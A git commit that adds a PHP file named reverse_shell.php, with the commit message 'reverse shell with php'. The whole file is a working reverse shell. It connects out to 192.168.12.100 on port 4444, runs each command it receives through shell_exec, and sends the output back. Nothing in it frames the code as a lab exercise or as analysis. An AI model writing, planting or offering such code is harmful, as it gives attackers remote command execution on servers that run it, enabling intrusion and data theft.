1325cdc2998f43c1df5c70ee12af789808165af7
Fox0nTheRun <70911096+Fox0nTheRun@users.noreply.github.com>
2021-07-01 12:21:09 -0400

    reverse shell with php

---
+++ reverse_shell.php
@@ -0,0 +1,35 @@
+<?php 
+$socket = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
+socket_bind($socket, '0.0.0.0', 51234);
+$connection = socket_connect($socket, '192.168.12.100', 4444);
+$output = array();;
+$message = "# ";
+while ($socket && $connection){
+	$message = "# ";
+	socket_send($socket, utf8_encode($message), strlen($message), MSG_EOF);
+	
+	
+	$read = false;
+	while($read == false){
+	$read = socket_recv($socket, $data, 1024, MSG_DONTWAIT);
+	}
+	$data = trim(utf8_decode($data));
+	if($data != 'exit' ){
+		if(!(empty($read))){
+		$output = shell_exec($data);
+		socket_send($socket, $output, strlen($output) , MSG_EOF);
+		$output = array();
+		}
+		
+	}
+	else{
+		$connection = false;
+		socket_close($socket);
+	}
+	
+	
+	
+	
+	
+}
+
